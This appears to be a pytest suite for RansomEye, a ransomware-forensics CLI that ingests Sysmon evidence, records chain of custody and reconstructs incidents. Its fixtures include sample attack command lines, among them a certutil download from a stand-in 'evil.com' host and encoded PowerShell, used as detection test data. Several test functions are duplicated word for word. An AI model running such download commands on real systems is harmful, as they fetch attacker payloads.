import os
import subprocess
import sys
from pathlib import Path

from ransomeye.commands import print_case_timeline, print_case_tree
from ransomeye.storage import EvidenceStore


def test_print_case_timeline_renders_expected_columns(capsys, tmp_path):
    database_path = tmp_path / "ransomeye.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="RE-LIVE-001", case_name="Timeline View", host="LAPTOP-AKCCFV29")
    store.save_event(
        "RE-LIVE-001",
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T21:48:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "100",
            "process_guid": "guid-1",
            "parent_process_guid": "guid-parent",
            "parent_image": r"C:\Windows\explorer.exe",
            "command_line": "powershell.exe -NoProfile",
        },
    )
    store.save_event(
        "RE-LIVE-001",
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T21:48:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "conhost.exe",
            "pid": "200",
            "process_guid": "guid-2",
            "parent_process_guid": "guid-1",
            "parent_image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "parent_pid": "100",
            "command_line": "conhost.exe",
        },
    )
    store.close()

    print_case_timeline(database_path, "RE-LIVE-001")
    output = capsys.readouterr().out

    assert "Case: RE-LIVE-001" in output
    assert "Host: LAPTOP-AKCCFV29" in output
    assert "powershell.exe" in output
    assert "conhost.exe" in output
    assert "explorer.exe" in output


def test_print_case_tree_renders_root_and_children(capsys, tmp_path):
    database_path = tmp_path / "ransomeye.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="RE-TREE-001", case_name="Tree View", host="LAPTOP-AKCCFV29")
    store.save_event(
        "RE-TREE-001",
        {
            "event_id": "event-1",
            "timestamp": "2026-08-08T21:48:01Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "powershell.exe",
            "pid": "100",
            "command_line": "powershell.exe -NoProfile",
        },
    )
    store.save_event(
        "RE-TREE-001",
        {
            "event_id": "event-2",
            "timestamp": "2026-08-08T21:48:02Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "conhost.exe",
            "pid": "200",
            "parent_pid": "100",
            "command_line": "conhost.exe",
        },
    )
    store.close()

    print_case_tree(database_path, "RE-TREE-001")
    output = capsys.readouterr().out

    assert "Case: RE-TREE-001" in output
    assert "powershell.exe [PID 100]" in output
    assert "conhost.exe [PID 200]" in output
    assert "└──" in output


def _run_command(args, cwd=None):
    env = os.environ.copy()
    env["PYTHONPATH"] = str(Path(__file__).resolve().parents[1] / "src")
    result = subprocess.run(
        [sys.executable, "-m", "ransomeye.commands", *args],
        cwd=cwd,
        env=env,
        capture_output=True,
        text=True,
    )
    return result



def test_custody_record_command_creates_event(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "Initial report generated",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Recorded custody event for case CASE-001" in result.stdout

    store = EvidenceStore(database_path)
    events = store.get_custody_events("CASE-001")
    store.close()

    assert len(events) == 1
    assert events[0]["action"] == "created"
    assert events[0]["analyst"] == "analyst@example.com"


def test_custody_list_command_prints_history(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.record_custody_event(
        case_id="CASE-001",
        artifact_path="reports/case-report.txt",
        sha256="b" * 64,
        action="created",
        analyst="analyst@example.com",
        note="Initial report generated",
        verification_result=None,
    )
    store.close()

    result = _run_command(
        [
            "custody",
            "list",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Artifact: reports/case-report.txt" in result.stdout
    assert "Action: created" in result.stdout
    assert "Analyst: analyst@example.com" in result.stdout


def test_custody_record_rejects_invalid_action(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "deleted",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Invalid custody action" in result.stderr


def test_custody_record_rejects_missing_case(tmp_path):
    database_path = tmp_path / "test.db"

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "a" * 64,
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Case not found: CASE-001" in result.stderr


def test_custody_record_rejects_invalid_hash(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-001", case_name="Custody Command")
    store.close()

    result = _run_command(
        [
            "custody",
            "record",
            "--database",
            str(database_path),
            "--case",
            "CASE-001",
            "--artifact",
            "reports/case-report.txt",
            "--hash",
            "deadbeef",
            "--action",
            "created",
            "--analyst",
            "analyst@example.com",
            "--note",
            "",
        ],
        cwd=tmp_path,
    )

    assert result.returncode != 0
    assert "Invalid SHA-256 digest" in result.stderr


def test_export_command(tmp_path):
    database_path = tmp_path / "test.db"
    store = EvidenceStore(database_path)
    store.create_case(case_id="CASE-CLI-001", case_name="Export CLI Case")
    store.close()

    output_dir = tmp_path / "exports" / "CASE-CLI-001"

    result = _run_command(
        [
            "export",
            "--database",
            str(database_path),
            "--case",
            "CASE-CLI-001",
            "--output",
            str(output_dir),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Exported case package to" in result.stdout
    assert (output_dir / "MANIFEST.sha256").exists()


def test_cli_help():
    result = _run_command(["--help"])

    assert result.returncode == 0
    assert "timeline" in result.stdout
    assert "database" in result.stdout
    assert "ingest" in result.stdout


def test_cli_invalid_command():
    result = _run_command(["invalid-command"])

    assert result.returncode == 2
    assert "usage:" in result.stderr.lower()


# --- Milestone 21.3 CLI Ingestion Tests ---

import json
from ransomeye.commands import ingest_evidence, parse_evidence_file


SAMPLE_SYSMON_XML = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-TEST-1}</Data>
    <Data Name="ProcessId">4532</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -EncodedCommand SGVsbG8=</Data>
    <Data Name="User">LAB\\Student</Data>
  </EventData>
</Event>"""

SAMPLE_SYSMON_MULTI_XML = """<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:00.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-MULTI-1}</Data>
    <Data Name="ProcessId">1001</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc AAAA</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-08-08T15:00:05.000Z"/>
  </System>
  <EventData>
    <Data Name="ProcessGuid">{GUID-MULTI-2}</Data>
    <Data Name="ProcessId">1002</Data>
    <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
    <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil.com/x.bin out.bin</Data>
  </EventData>
</Event>
</Events>"""


def test_ingest_json_single_event_via_cli(tmp_path):
    db_path = tmp_path / "cli_ingest.db"
    json_path = tmp_path / "single_event.json"
    event_data = {
        "event_id": "evt-json-1",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    json_path.write_text(json.dumps(event_data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-JSON-1",
            "--file",
            str(json_path),
            "--case-name",
            "JSON Single Case",
            "--host",
            "HOST-A",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "RansomEye evidence ingestion complete" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Score: 25" in result.stdout

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-JSON-1")
    events = store.get_case_events("CASE-JSON-1")
    store.close()

    assert case["case_name"] == "JSON Single Case"
    assert len(events) == 1
    assert events[0]["event_id"] == "evt-json-1"


def test_ingest_json_list_and_events_wrapper(tmp_path):
    db_path = tmp_path / "list_ingest.db"
    json_path = tmp_path / "events_wrapper.json"
    data = {
        "events": [
            {
                "event_id": "evt-w-1",
                "timestamp": "2026-08-08T15:00:00Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -enc AAAA",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
            {
                "event_id": "evt-w-2",
                "timestamp": "2026-08-08T15:00:05Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
        ]
    }
    json_path.write_text(json.dumps(data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-WRAPPER",
            "--file",
            str(json_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout
    assert "Correlations: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-WRAPPER")
    findings = store.get_case_findings("CASE-WRAPPER")
    store.close()

    assert len(events) == 2
    assert len(findings) == 2


def test_ingest_sysmon_xml_fixture_via_cli(tmp_path):
    db_path = tmp_path / "xml_ingest.db"
    xml_path = tmp_path / "sample.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-1",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Format: sysmon-xml" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-XML-1")
    store.close()

    assert len(events) == 1
    assert events[0]["process_guid"] == "{GUID-TEST-1}"


def test_ingest_sysmon_xml_multiple_events(tmp_path):
    db_path = tmp_path / "multi_xml.db"
    xml_path = tmp_path / "multi.xml"
    xml_path.write_text(SAMPLE_SYSMON_MULTI_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-MULTI",
            "--file",
            str(xml_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout


def test_ingest_duplicate_events_counted(tmp_path):
    db_path = tmp_path / "dup.db"
    xml_path = tmp_path / "dup.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    # Ingest first time
    _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    # Ingest second time -> 1 duplicate
    result2 = _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    assert result2.returncode == 0
    assert "Events read: 1" in result2.stdout
    assert "Events accepted: 0" in result2.stdout
    assert "Duplicates: 1" in result2.stdout


def test_ingest_missing_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(tmp_path / "nonexistent.json"),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file not found" in result.stderr


def test_ingest_json_single_event_via_cli(tmp_path):
    db_path = tmp_path / "cli_ingest.db"
    json_path = tmp_path / "single_event.json"
    event_data = {
        "event_id": "evt-json-1",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand SGVsbG8=",
        "pid": "4532",
    }
    json_path.write_text(json.dumps(event_data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-JSON-1",
            "--file",
            str(json_path),
            "--case-name",
            "JSON Single Case",
            "--host",
            "HOST-A",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "RansomEye evidence ingestion complete" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Score: 25" in result.stdout

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-JSON-1")
    events = store.get_case_events("CASE-JSON-1")
    store.close()

    assert case["case_name"] == "JSON Single Case"
    assert len(events) == 1
    assert events[0]["event_id"] == "evt-json-1"


def test_ingest_json_list_and_events_wrapper(tmp_path):
    db_path = tmp_path / "list_ingest.db"
    json_path = tmp_path / "events_wrapper.json"
    data = {
        "events": [
            {
                "event_id": "evt-w-1",
                "timestamp": "2026-08-08T15:00:00Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -enc AAAA",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
            {
                "event_id": "evt-w-2",
                "timestamp": "2026-08-08T15:00:05Z",
                "source": "sysmon",
                "event_type": "process_creation",
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe out.exe",
                "pid": "1000",
                "process_guid": "{G-1}",
            },
        ]
    }
    json_path.write_text(json.dumps(data), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-WRAPPER",
            "--file",
            str(json_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout
    assert "Correlations: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-WRAPPER")
    findings = store.get_case_findings("CASE-WRAPPER")
    store.close()

    assert len(events) == 2
    assert len(findings) == 2


def test_ingest_sysmon_xml_fixture_via_cli(tmp_path):
    db_path = tmp_path / "xml_ingest.db"
    xml_path = tmp_path / "sample.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-1",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Format: sysmon-xml" in result.stdout
    assert "Events read: 1" in result.stdout
    assert "Events accepted: 1" in result.stdout

    store = EvidenceStore(db_path)
    events = store.get_case_events("CASE-XML-1")
    store.close()

    assert len(events) == 1
    assert events[0]["process_guid"] == "{GUID-TEST-1}"


def test_ingest_sysmon_xml_multiple_events(tmp_path):
    db_path = tmp_path / "multi_xml.db"
    xml_path = tmp_path / "multi.xml"
    xml_path.write_text(SAMPLE_SYSMON_MULTI_XML, encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-XML-MULTI",
            "--file",
            str(xml_path),
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 2" in result.stdout
    assert "Events accepted: 2" in result.stdout


def test_ingest_duplicate_events_counted(tmp_path):
    db_path = tmp_path / "dup.db"
    xml_path = tmp_path / "dup.xml"
    xml_path.write_text(SAMPLE_SYSMON_XML, encoding="utf-8")

    # Ingest first time
    _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    # Ingest second time -> 1 duplicate
    result2 = _run_command(["ingest", "--database", str(db_path), "--case", "CASE-DUP", "--file", str(xml_path)])

    assert result2.returncode == 0
    assert "Events read: 1" in result2.stdout
    assert "Events accepted: 0" in result2.stdout
    assert "Duplicates: 1" in result2.stdout


def test_ingest_missing_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(tmp_path / "nonexistent.json"),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file not found" in result.stderr


def test_ingest_invalid_json_fails(tmp_path):
    db_path = tmp_path / "test.db"
    bad_json = tmp_path / "bad.json"
    bad_json.write_text("{broken json", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(bad_json),
        ]
    )
    assert result.returncode != 0
    assert "Invalid JSON" in result.stderr


def test_ingest_invalid_xml_fails(tmp_path):
    db_path = tmp_path / "test.db"
    bad_xml = tmp_path / "bad.xml"
    bad_xml.write_text("<not valid xml at all", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(bad_xml),
        ]
    )
    assert result.returncode != 0
    assert "No valid Sysmon XML events found" in result.stderr


def test_ingest_empty_file_fails(tmp_path):
    db_path = tmp_path / "test.db"
    empty_file = tmp_path / "empty.json"
    empty_file.write_text("   \n", encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-ERR",
            "--file",
            str(empty_file),
        ]
    )
    assert result.returncode != 0
    assert "Evidence file is empty" in result.stderr


def test_ingest_existing_case_preserves_metadata(tmp_path):
    db_path = tmp_path / "existing.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-EXIST", "Original Name", host="ORIGINAL-HOST")
    store.close()

    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(json.dumps({"event_id": "e-1", "timestamp": "2026-08-08T15:00:00Z", "source": "sysmon", "event_type": "process_creation"}), encoding="utf-8")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-EXIST",
            "--file",
            str(json_path),
            "--case-name",
            "New Ignored Name",
        ]
    )
    assert result.returncode == 0

    store = EvidenceStore(db_path)
    case = store.get_case("CASE-EXIST")
    store.close()

    assert case["case_name"] == "Original Name"
    assert case["host"] == "ORIGINAL-HOST"


def test_investigation_graph_command(tmp_path):
    db_path = tmp_path / "graph_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-GRAPH",
        "--file",
        str(json_path),
    ])

    result = _run_command([
        "investigation",
        "graph",
        "--database",
        str(db_path),
        "--case",
        "CASE-GRAPH",
    ])

    assert result.returncode == 0
    assert "INVESTIGATION GRAPH" in result.stdout
    assert "Case:" in result.stdout
    assert "CASE-GRAPH" in result.stdout
    assert "Processes:" in result.stdout


def test_investigation_reconstruct_command(tmp_path):
    db_path = tmp_path / "reconstruct_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
            "command_line": "cmd.exe /c echo test",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-RECON",
        "--file",
        str(json_path),
    ])

    result = _run_command([
        "investigation",
        "reconstruct",
        "--database",
        str(db_path),
        "--case",
        "CASE-RECON",
    ])

    assert result.returncode == 0
    assert "ATTACK RECONSTRUCTION" in result.stdout
    assert "PROCESS_EXECUTION" in result.stdout
    assert "cmd.exe [PID 1000]" in result.stdout


def test_investigation_timeline_and_flag_command(tmp_path):
    db_path = tmp_path / "adv_timeline_test.db"
    json_path = tmp_path / "event.json"
    import json
    json_path.write_text(
        json.dumps({
            "event_id": "e-1",
            "timestamp": "2026-08-08T15:00:00Z",
            "source": "sysmon",
            "event_type": "process_creation",
            "process_name": "cmd.exe",
            "pid": "1000",
            "process_guid": "{G-1000}",
        }),
        encoding="utf-8",
    )

    _run_command([
        "ingest",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
        "--file",
        str(json_path),
    ])

    # 1. Test via `investigation timeline`
    result1 = _run_command([
        "investigation",
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
    ])
    assert result1.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result1.stdout
    assert "PROCESS" in result1.stdout

    # 2. Test via `timeline --advanced`
    result2 = _run_command([
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-ADV",
        "--advanced",
    ])
    assert result2.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result2.stdout
    assert "PROCESS" in result2.stdout


def test_realistic_ransomware_sequence_integration(tmp_path):
    import os
    db_path = tmp_path / "realistic_ransomware.db"

    samples_dir = os.path.join(os.path.dirname(__file__), "..", "samples", "sysmon")
    xml_path = os.path.join(samples_dir, "realistic_ransomware_sequence.xml")

    result = _run_command(
        [
            "ingest",
            "--database",
            str(db_path),
            "--case",
            "CASE-RANSOMWARE",
            "--file",
            str(xml_path),
            "--format",
            "sysmon-xml",
        ],
        cwd=tmp_path,
    )

    assert result.returncode == 0
    assert "Events read: 7" in result.stdout
    assert "Events accepted: 7" in result.stdout
    assert "Events rejected: 0" in result.stdout
    assert "Duplicates: 0" in result.stdout
    assert "Findings: 4" in result.stdout or "Findings" in result.stdout

    # Verify we can run graph and timeline without crashing on real data
    result2 = _run_command([
        "investigation",
        "timeline",
        "--database",
        str(db_path),
        "--case",
        "CASE-RANSOMWARE",
    ])
    assert result2.returncode == 0
    assert "ADVANCED INVESTIGATION TIMELINE" in result2.stdout


def test_command_evidence_search_inspect(tmp_path, capsys):
    from ransomeye.commands import main
    from ransomeye.storage import EvidenceStore
    import sys
    from unittest.mock import patch
    import json

    db_path = tmp_path / "cli_search.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-CLI", "CLI Search Test")

    event_network = {
        "event_id": "EVT-NET-CLI",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "network_connect",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc XYZ",
        "network": {"destination_ip": "203.0.113.55"},
        "metadata": {"test": "val"},
    }
    store.save_event("CASE-CLI", event_network)
    store.close()

    # 1. evidence search returns matching rows
    with patch.object(sys, "argv", ["ransomeye", "evidence", "search", "--database", str(db_path), "--case", "CASE-CLI", "--query", "203.0.113.55"]):
        main()
    out, err = capsys.readouterr()
    assert "EVT-NET-CLI" in out
    assert "203.0.113.55" in out

    # 2. evidence search returns no-match output
    with patch.object(sys, "argv", ["ransomeye", "evidence", "search", "--database", str(db_path), "--case", "CASE-CLI", "--query", "NOTFOUND123"]):
        main()
    out, err = capsys.readouterr()
    assert "No matching evidence found" in out

    # 3. evidence inspect prints valid JSON with network data
    with patch.object(sys, "argv", ["ransomeye", "evidence", "inspect", "--database", str(db_path), "--case", "CASE-CLI", "--event", "EVT-NET-CLI"]):
        main()
    out, err = capsys.readouterr()

    parsed = json.loads(out)
    assert parsed["event_id"] == "EVT-NET-CLI"
    assert parsed["network_json"]["destination_ip"] == "203.0.113.55"
    assert parsed["metadata_json"]["test"] == "val"

    # 4. missing event returns clear error
    with patch.object(sys, "argv", ["ransomeye", "evidence", "inspect", "--database", str(db_path), "--case", "CASE-CLI", "--event", "EVT-MISSING"]):
        try:
            main()
        except SystemExit as e:
            assert e.code == 1
    out, err = capsys.readouterr()
    assert "Event not found" in err


def test_command_evidence_trace(tmp_path, capsys):
    from ransomeye.commands import main
    from ransomeye.storage import EvidenceStore
    import sys
    from unittest.mock import patch

    db_path = tmp_path / "cli_trace.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-TRACE", "CLI Trace Test")

    event_network = {
        "event_id": "EVT-NET-CLI",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "network_connect",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc XYZ",
        "pid": 200,
        "parent_pid": 100,
        "process_guid": "{AAAA-BBBB}",
        "parent_process_guid": "{CCCC-DDDD}",
        "network": {"destination_ip": "203.0.113.55"},
        "metadata": {"test": "val"},
    }

    event_parent = {
        "event_id": "EVT-PARENT",
        "timestamp": "2026-08-08T14:59:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "cmd.exe",
        "command_line": "cmd.exe /c start",
        "pid": 100,
        "process_guid": "{CCCC-DDDD}",
        "network": {},
        "metadata": {},
    }
    store.save_event("CASE-TRACE", event_network)
    store.save_event("CASE-TRACE", event_parent)

    finding_id = store.save_finding(
        case_id="CASE-TRACE",
        finding={
            "type": "defense_evasion",
            "score": 30,
            "confidence": 0.9,
            "technique": "T1490",
            "reason": "VSSAdmin Shadow Copy Deletion",
        },
        event_ids=["EVT-NET-CLI"],
    )

    assessment = {
        "score": 30,
        "severity": "HIGH",
        "confidence": 0.9,
        "reasons": ["Defense evasion"],
        "techniques": ["T1490"],
        "correlations": [
            {
                "incident_id": "INC-TEST-001",
                "finding_ids": [finding_id],
                "evidence_ids": [],
            }
        ],
    }
    store.save_assessment("CASE-TRACE", assessment)
    store.close()

    # 1. evidence trace returns context
    with patch.object(sys, "argv", ["ransomeye", "evidence", "trace", "--database", str(db_path), "--case", "CASE-TRACE", "--event", "EVT-NET-CLI"]):
        main()
    out, err = capsys.readouterr()

    assert "RANSOMEYE EVIDENCE TRACE" in out
    assert "EVT-NET-CLI" in out
    assert "--- Process Lineage ---" in out
    assert "Parent: cmd.exe" in out
    assert "{CCCC-DDDD}" in out
    assert "Current: powershell.exe" in out
    assert "{AAAA-BBBB}" in out
    assert "--- Findings ---" in out
    assert str(finding_id) in out
    assert "T1490" in out
    assert "VSSAdmin Shadow Copy Deletion" in out
    assert "--- Correlations / Incidents ---" in out
    assert "INC-TEST-001" in out

    # 2. evidence trace returns no findings for parent
    with patch.object(sys, "argv", ["ransomeye", "evidence", "trace", "--database", str(db_path), "--case", "CASE-TRACE", "--event", "EVT-PARENT"]):
        main()
    out, err = capsys.readouterr()
    assert "RANSOMEYE EVIDENCE TRACE" in out
    assert "EVT-PARENT" in out
    assert "None" in out # Under findings and correlations


def test_command_investigation_incident(tmp_path, capsys):
    from ransomeye.commands import main
    from ransomeye.storage import EvidenceStore
    import sys
    from unittest.mock import patch

    db_path = tmp_path / "cli_incident.db"
    store = EvidenceStore(db_path)
    store.create_case("CASE-INC", "CLI Incident Test")

    event_1 = {
        "event_id": "EVT-INC-01",
        "timestamp": "2026-08-08T15:00:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -enc XYZ",
        "pid": 200,
        "process_guid": "{AAAA-BBBB}",
    }

    event_2 = {
        "event_id": "EVT-INC-02",
        "timestamp": "2026-08-08T14:59:00Z",
        "source": "sysmon",
        "event_type": "process_creation",
        "process_name": "cmd.exe",
        "command_line": "cmd.exe /c start",
        "pid": 100,
        "process_guid": "{CCCC-DDDD}",
    }

    # Intentionally insert out of chronological order to test sorting
    store.save_event("CASE-INC", event_1)
    store.save_event("CASE-INC", event_2)

    finding_id = store.save_finding(
        case_id="CASE-INC",
        finding={
            "type": "suspicious_powershell",
            "score": 40,
            "confidence": 0.8,
            "technique": "T1059.001",
            "reason": "Encoded powershell",
        },
        event_ids=["EVT-INC-01"],
    )

    import hashlib
    import json
    payload = {
        "event_ids": ["EVT-INC-01"],
        "reason": "Encoded powershell",
        "technique": "T1059.001",
        "type": "suspicious_powershell",
    }
    canonical_json = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(canonical_json.encode("utf-8")).hexdigest()[:16]
    hash_id = f"F-{digest}"

    assessment = {
        "score": 40,
        "severity": "HIGH",
        "confidence": 0.8,
        "reasons": ["Defense evasion"],
        "techniques": ["T1059.001"],
        "correlations": [
            {
                "incident_id": "INC-TEST-100",
                "finding_ids": [hash_id],
                "evidence_ids": ["EVT-INC-01", "EVT-INC-02", "EVT-MISSING"],
                "start_time": "2026-08-08T14:59:00Z",
                "end_time": "2026-08-08T15:00:00Z",
            },
            {
                "incident_id": "INC-TEST-OTHER",
                "finding_ids": [],
                "evidence_ids": [],
            }
        ],
    }
    store.save_assessment("CASE-INC", assessment)
    store.close()

    # 1. Existing incident
    with patch.object(sys, "argv", ["ransomeye", "investigation", "incident", "--database", str(db_path), "--case", "CASE-INC", "--incident", "INC-TEST-100"]):
        main()
    out, err = capsys.readouterr()

    assert "RANSOMEYE INCIDENT REPORT" in out
